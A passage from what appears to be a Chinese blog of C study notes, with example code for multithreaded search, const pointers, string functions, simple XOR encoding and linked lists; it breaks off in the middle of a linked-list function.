<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*使用多线程查找生产随机数中选中的数字 这里是100个数据使用10个线程</span></span><br><span class="line"><span class="comment">如果是100个数据 8个线程 没法除尽   14*7=98  最后一个线程在处理剩下的</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//#define M 100  // 数据数量</span></span><br><span class="line"><span class="comment">//#define N 8 //线程数量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">stINFO</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span>* lpstart; <span class="comment">// 起始地址</span></span><br><span class="line"><span class="type">int</span> length;</span><br><span class="line"><span class="type">int</span> findNum;</span><br><span class="line"><span class="type">int</span> threadId;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> FLAG = <span class="number">0</span>; <span class="comment">//判断是否找到 没找到为0  找到为1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">find</span><span class="params">(<span class="type">void</span>* p)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (FLAG) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">stINFO</span>* lp = p;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;线程%d开始查找-----------------\n&quot;</span>,lp-&gt;threadId);</span><br><span class="line">    <span class="keyword">for</span> ( <span class="type">int</span>* start = lp-&gt;lpstart; start &lt; (lp-&gt;lpstart+lp-&gt;length); start++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (*start == lp-&gt;findNum) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;线程%d找到，数据为%d,内存地址为:%p---\n&quot;</span>, lp-&gt;threadId, *start, start);</span><br><span class="line">                FLAG = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;线程%d查找完毕，未找到----------\n&quot;</span>,lp-&gt;threadId);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> M 100 <span class="comment">//初始化100个数据量</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> a[M] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">time_t</span> ts;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> randomNum = <span class="built_in">time</span>(&amp;ts);</span><br><span class="line">    <span class="built_in">srand</span>(randomNum);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; M; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            a[i] = <span class="built_in">rand</span>() % <span class="number">100</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%4d&quot;</span>, a[i]);</span><br><span class="line">            <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">10</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> findnumber;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;输入要查找的数字:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf_s</span>(<span class="string">&quot;%d&quot;</span>, &amp;findnumber);</span><br><span class="line">    <span class="type">int</span> N;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;输入使用的线程数量:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf_s</span>(<span class="string">&quot;%d&quot;</span>, &amp;N);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">stINFO</span> info[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (M % N == <span class="number">0</span>) &#123; <span class="comment">//数据标准可以除尽 数据量可以被线程数量平均分配</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                info[i].lpstart = a + M/N * i;</span><br><span class="line">                info[i].length = M/N;</span><br><span class="line">                info[i].findNum = findnumber;</span><br><span class="line">                info[i].threadId = i;</span><br><span class="line"></span><br><span class="line">                _beginthread(find, <span class="number">0</span>, &amp;info[i]);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;<span class="comment">// 100/7=14+2     100 8</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; N<span class="number">-1</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                info[i].lpstart = a + M / (N<span class="number">-1</span>) * i;</span><br><span class="line">                info[i].length = M / (N<span class="number">-1</span>);</span><br><span class="line">                info[i].findNum = findnumber;</span><br><span class="line">                info[i].threadId = i;</span><br><span class="line">                _beginthread(find, <span class="number">0</span>, &amp;info[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">//处理最后一个线程 </span></span><br><span class="line">        <span class="type">int</span> i = N - <span class="number">1</span>;</span><br><span class="line">        info[i].lpstart = a + M / (N - <span class="number">1</span>) * i;</span><br><span class="line">        info[i].length = M / (N - <span class="number">1</span>);</span><br><span class="line">        info[i].findNum = findnumber;</span><br><span class="line">        info[i].threadId = i;</span><br><span class="line">        _beginthread(find, <span class="number">0</span>, &amp;info[i]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="const权限控制"><a href="#const权限控制" class="headerlink" title="const权限控制"></a>const权限控制</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* const 做权限控制</span></span><br><span class="line"><span class="comment">const 在*左边  const int* p 			（查询权限） 可以查询所有</span></span><br><span class="line"><span class="comment">const 在*右边  int * const p			可以修改值 不可以修改指向    只能修改自己 不能把地址执行别的地址（类似用户权限）</span></span><br><span class="line"><span class="comment">const 在*两边  const int * const p		只能读自己的数据 没法修改</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;		</span><br><span class="line">    <span class="built_in">int</span>(*p)[<span class="number">10</span>] = &amp;a;			<span class="comment">//数组指针</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n%p&quot;</span>,p,p+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="字符串相关函数编写"><a href="#字符串相关函数编写" class="headerlink" title="字符串相关函数编写"></a>字符串相关函数编写</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">GetStringLenth</span><span class="params">(<span class="type">char</span> *str)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> length = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (*str)</span><br><span class="line">        &#123;</span><br><span class="line">            length++;</span><br><span class="line">            *str++;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//双指针轮询  使用两个指针  错位</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DeleteStringD</span><span class="params">(<span class="type">char</span> *str)</span></span>&#123;</span><br><span class="line">    <span class="type">char</span>* p1 = str;</span><br><span class="line">    <span class="type">char</span>* p2 = str;</span><br><span class="line">    <span class="keyword">while</span> (*p1 = *p2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (*p1 != <span class="string">&#x27;d&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果不是选中的字母 两个指针就同时往前动</span></span><br><span class="line">            <span class="comment">//				   p1-p1	 -&gt;  dedf =&gt; eedf  =&gt;  edf  =&gt; ddf =&gt; fdf =&gt; df =&gt; df</span></span><br><span class="line">            <span class="comment">//			 a b c d  e  d  f  </span></span><br><span class="line">            <span class="comment">//				      p2-p2   -&gt;           edf  =&gt;  df   =&gt; f  =&gt; f   =&gt; f  =&gt; 空</span></span><br><span class="line">            <span class="comment">//                           abcdedf =&gt; abceedf          =&gt; abceddf         =&gt; abcefdf =&gt; abcef</span></span><br><span class="line"></span><br><span class="line">            p1++;</span><br><span class="line">            p2++;  <span class="comment">//如果是d 那么p1不动 然后p2往前面加  到d时 p2把值赋给p1 </span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            p2++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串异或加密   // 异或之后 再异或就会变成原来的数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">XOREn</span><span class="params">(<span class="type">char</span>* str, <span class="type">int</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            str[i] ^= key;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> str1[] = <span class="string">&quot;abcdedf&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//printf(&quot;%d\n&quot;, GetStringLenth(str1));</span></span><br><span class="line">    <span class="comment">//printf(&quot;%d&quot;, strlen(str1));</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//DeleteStringD(str1);</span></span><br><span class="line">    <span class="comment">//printf(&quot;%s\n&quot;, str1);</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">XOREn</span>(str1,<span class="number">64</span>);</span><br><span class="line">    <span class="comment">//printf(&quot;%s\n&quot;, str1);</span></span><br><span class="line">    <span class="comment">//XOREn(str1,64);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, str1);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="异或分段加密"><a href="#异或分段加密" class="headerlink" title="异或分段加密"></a>异或分段加密</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 异或分段加密</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> 异或分段加密(<span class="type">char</span>* str, <span class="type">char</span>* pass) &#123;</span><br><span class="line">    <span class="type">int</span> 加密字符串长度 = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="type">int</span> 密码长度 = <span class="built_in">strlen</span>(pass);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (加密字符串长度 % 密码长度 == <span class="number">0</span>) &#123;				<span class="comment">// 120 / 6     122 /6 </span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; 加密字符串长度 / 密码长度; i++)</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; 密码长度; j++)</span><br><span class="line">            &#123;</span><br><span class="line">            str[i * 密码长度 + j] ^= pass[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;												<span class="comment">// 122 / 6 = 20...2</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; 加密字符串长度 / 密码长度; i++)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; 密码长度; j++)</span><br><span class="line">        &#123;</span><br><span class="line">        str[i * 密码长度 + j] ^= pass[j];		<span class="comment">// 1-120</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> k = <span class="number">0</span>; k &lt; 加密字符串长度 % 密码长度; k++)</span><br><span class="line">    &#123;</span><br><span class="line">    str[加密字符串长度 / 密码长度 * 密码长度 + k] ^= pass[k];	<span class="comment">// 121  122</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> str[] = <span class="string">&quot;awagege&quot;</span>;</span><br><span class="line">    <span class="type">char</span> pass[] = <span class="string">&quot;12345&quot;</span>;</span><br><span class="line">    异或分段加密(str, pass);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%s&quot;</span>, str);</span><br><span class="line">    异或分段加密(str, pass);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%s&quot;</span>, str);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h4><p> 增加、删除不需要移动直接改变指针的指向   缺点：查询/修改无法像数组定位，必须使用循环方式进行定位</p>
<p>(为了便于理解 多数函数都使用累中文)</p>
<h5 id="静态链表"><a href="#静态链表" class="headerlink" title="静态链表"></a>静态链表</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">NODE</span> &#123;</span><br><span class="line"><span class="type">int</span> num;</span><br><span class="line"><span class="type">char</span> s[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">NODE</span>* lpNext;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">NODE</span> st1, st2, st3, st4;</span><br><span class="line">    st1.num = <span class="number">1</span>;</span><br><span class="line">    st2.num = <span class="number">2</span>;</span><br><span class="line">    st3.num = <span class="number">3</span>;</span><br><span class="line">    st4.num = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">NODE</span>* p = &amp;st1;	<span class="comment">// 头节点</span></span><br><span class="line"></span><br><span class="line">    st1.lpNext = &amp;st2;</span><br><span class="line">    st2.lpNext = &amp;st3;</span><br><span class="line">    st3.lpNext = &amp;st4;</span><br><span class="line">    st4.lpNext = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//删除st3  </span></span><br><span class="line">    st2.lpNext = st3.lpNext;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//添加st5到st4后</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">NODE</span> st5;</span><br><span class="line">    st5.num = <span class="number">100</span>;</span><br><span class="line">    st5.lpNext = <span class="literal">NULL</span>;</span><br><span class="line">    st4.lpNext = &amp;st5;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//中间插入在st1 st2之间</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">NODE</span> st6;</span><br><span class="line">    st6.num = <span class="number">6</span>;</span><br><span class="line">    st6.lpNext = &amp;st2;</span><br><span class="line">    st1.lpNext = &amp;st6;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//修改st6的num</span></span><br><span class="line">    <span class="keyword">for</span> (p ; p!=<span class="literal">NULL</span> ; p= p-&gt;lpNext)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (p-&gt;num == <span class="number">100</span>) &#123;</span><br><span class="line">                p-&gt;num = <span class="number">20</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, p-&gt;num);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//遍历num</span></span><br><span class="line">    <span class="comment">//while (p) &#123;</span></span><br><span class="line">    <span class="comment">//	printf(&quot;%d\n&quot;, p-&gt;num);</span></span><br><span class="line">    <span class="comment">//	p = p-&gt;lpNext;</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">    <span class="comment">//或者</span></span><br><span class="line">    <span class="comment">/*for (p ; p!=NULL ; p = p-&gt;lpNext)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">printf(&quot;%d\n&quot;, p-&gt;num);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="动态链表"><a href="#动态链表" class="headerlink" title="动态链表"></a>动态链表</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// linked.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">NODE</span> &#123;</span><br><span class="line"><span class="type">int</span> num;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">NODE</span>* lpNext ;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">NODE</span> node;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> 显示链表内容(node* 头节点);</span><br><span class="line"><span class="type">void</span> 尾部添加(node* 头节点, <span class="type">int</span> data);    <span class="comment">//头节点 起始数据地址</span></span><br><span class="line"><span class="type">void</span> 头部添加(node* 头节点, <span class="type">int</span> data);</span><br><span class="line"><span class="type">void</span> 删除(node* 头节点, <span class="type">int</span> data);</span><br><span class="line"><span class="type">void</span> 插入(node* 头节点, <span class="type">int</span> newdata, <span class="type">int</span> data);</span><br><span class="line"><span class="type">void</span> 修改(node* 头节点, <span class="type">int</span> newdata, <span class="type">int</span> data);</span><br><span class="line">node* 查找(node* 头节点, <span class="type">int</span> data);</span><br><span class="line"><span class="type">void</span> 打印环形列表(node* 头节点);</span><br><span class="line"><span class="type">int</span> 判断是否为环形链表(node* 头节点);</span><br></pre></td></tr></table></figure>



<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;linked.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    node* 头节点 = <span class="literal">NULL</span>;</span><br><span class="line">    尾部添加(&amp;头节点, <span class="number">1</span>);</span><br><span class="line">    尾部添加(&amp;头节点, <span class="number">2</span>);</span><br><span class="line">    尾部添加(&amp;头节点, <span class="number">4</span>);</span><br><span class="line">    尾部添加(&amp;头节点, <span class="number">6</span>);</span><br><span class="line">    尾部添加(&amp;头节点, <span class="number">8</span>);</span><br><span class="line">    头部添加(&amp;头节点, <span class="number">10</span>);</span><br><span class="line">    <span class="comment">//删除(&amp;头节点, 4);</span></span><br><span class="line">    <span class="comment">//插入(&amp;头节点, 5, 8);</span></span><br><span class="line">    <span class="comment">//修改(&amp;头节点, 20, 6);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建环形链表</span></span><br><span class="line">	node* p = 头节点;</span><br><span class="line">	<span class="keyword">for</span> (p; p-&gt;lpNext!=<span class="literal">NULL</span>; p=p-&gt;lpNext)</span><br><span class="line">	&#123;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	p-&gt;lpNext = 头节点;</span><br><span class="line">	判断是否为环形链表(头节点) ? <span class="built_in">printf</span>(<span class="string">&quot;环形\n&quot;</span>): <span class="built_in">printf</span>(<span class="string">&quot;不是环形\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	打印环形列表(头节点);</span><br><span class="line">	<span class="comment">//显示链表内容(头节点);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//查找(头节点, 1) == NULL ? printf(&quot;未找到查找数据&quot;) : printf(&quot;找到数据：%d，地址是：%p&quot;, 查找(头节点, 1)-&gt;num, 查找(头节点, 1));</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> 尾部添加(node** 头节点, <span class="type">int</span> data) &#123;		<span class="comment">//这里需要一个二级指针</span></span><br><span class="line">    <span class="comment">// 初始化一个新的节点</span></span><br><span class="line">    node* 新节点 = <span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(node));</span><br><span class="line">    新节点-&gt;lpNext = <span class="literal">NULL</span>;</span><br><span class="line">    新节点-&gt;num = data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*头节点 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        *头节点 = 新节点;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">    &#123;</span><br><span class="line">        node* p = *头节点;	<span class="comment">//备份一个头节点 方便后续操作</span></span><br><span class="line">        <span class="keyword">while</span> (p-&gt;lpNext !=<span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                p = p-&gt;lpNext;</span><br><span class="line">            &#125;</span><br><span class="line">        p-&gt;lpNext = 新节点;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> 头部添加(node ** 头节点 ,<span class="type">int</span> data) &#123;</span><br><span class="line">    <span class="comment">// 初始化一个新的节点</span></span><br><span class="line">    node* 新节点 = <span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(node));</span><br><span class="line">    新节点-&gt;lpNext = <span class="literal">NULL</span>;</span><br><span class="line">    新节点-&gt;num = data;</span><br><span class="line">    <span class="keyword">if</span> (*头节点 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        *头节点 = 新节点;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        新节点-&gt;lpNext = *头节点;  <span class="comment">//头节点的地址</span></span><br><span class="line">        *头节点 = 新节点;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> 显示链表内容(node* 头节点) &#123;</span><br><span class="line">    <span class="keyword">if</span> (头节点) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;数据为:%4d,当前节点地址为:%p,下一个节点地址为%p\n&quot;</span>, 头节点-&gt;num, 头节点, 头节点-&gt;lpNext);</span><br><span class="line">        显示链表内容(头节点-&gt;lpNext);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//双指针  p1在前 p2在后</span></span><br><span class="line"><span class="type">void</span> 删除(node** 头节点, <span class="type">int</span> data) &#123;</span><br><span class="line">    node *p1 = <span class="literal">NULL</span>, *p2 = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//备份一个头节点 再进行后续操作</span></span><br><span class="line">    p1 = *头节点;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (p1) &#123;</span><br><span class="line">        <span class="keyword">if</span> (p1-&gt;num != data) <span class="comment">//找不到要删除的数据</span></span><br><span class="line">        &#123;</span><br><span class="line">            p2 = p1;</span><br><span class="line">            p1 = p1-&gt;lpNext;		<span class="comment">// p1在p2前一个</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">//跳出</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (p1 != *头节点) &#123;</span><br><span class="line">        p2-&gt;lpNext = p1-&gt;lpNext;</span><br><span class="line">        <span class="built_in">free</span>(p1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>	<span class="comment">//p1在最前面（删除头节点）</span></span><br><span class="line">    &#123;</span><br><span class="line">        *头节点 = p1-&gt;lpNext;</span><br><span class="line">        <span class="built_in">free</span>(p1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> 插入(node **头节点, <span class="type">int</span> newdata, <span class="type">int</span> data) &#123;</span><br><span class="line">    node* p1 = <span class="literal">NULL</span>, * p2 = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化插入的新节点</span></span><br><span class="line">    node* 新节点 = <span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(node));</span><br><span class="line">    新节点-&gt;lpNext = <span class="literal">NULL</span>;</span><br><span class="line">    新节点-&gt;num = newdata;</span><br><span class="line"></span><br><span class="line"><span class="comment">//备份</span></span><br><span class="line">p1 = *头节点;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (p1) &#123;</span><br><span class="line">    <span class="keyword">if</span> (p1-&gt;num != data)  <span class="comment">//找不到要拆入到其前面的数据</span></span><br><span class="line">    &#123;</span><br><span class="line">        p2 = p1;</span><br><span class="line">        p1 = p1-&gt;lpNext;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (p1 == *头节点) </span><br><span class="line">&#123;</span><br><span class="line">    头节点 = 新节点;</span><br><span class="line">    新节点-&gt;lpNext = p1;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="comment">//如果在中间  p2   新节点   p1</span></span><br><span class="line">&#123;</span><br><span class="line">    p2-&gt;lpNext = 新节点;</span><br><span class="line">    新节点-&gt;lpNext = p1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> 修改(node** 头节点, <span class="type">int</span> newdata, <span class="type">int</span> data) &#123;  <span class="comment">//**二级指针 保存头节点的地址，不是一个备份副本 这样在后面main中 使用修改(头节点x,x)时可以修改头节点的值</span></span><br><span class="line">    node* p = <span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(node));</span><br><span class="line">p-&gt;lpNext = <span class="literal">NULL</span>;</span><br><span class="line">p-&gt;num = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">p = *头节点;</span><br><span class="line"><span class="keyword">while</span> (p!= <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;num == data) &#123;</span><br><span class="line">            p-&gt;num = newdata;</span><br><span class="line">            p = p-&gt;lpNext;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            p = p-&gt;lpNext;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">node* 查找(node* 头节点,<span class="type">int</span> data) &#123;  <span class="comment">//修改和查找差不多</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*while (头节点) &#123;</span></span><br><span class="line"><span class="comment">if (头节点-&gt;num == data) &#123;</span></span><br><span class="line"><span class="comment">return 头节点;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">头节点 = 头节点-&gt;lpNext;</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"></span><br><span 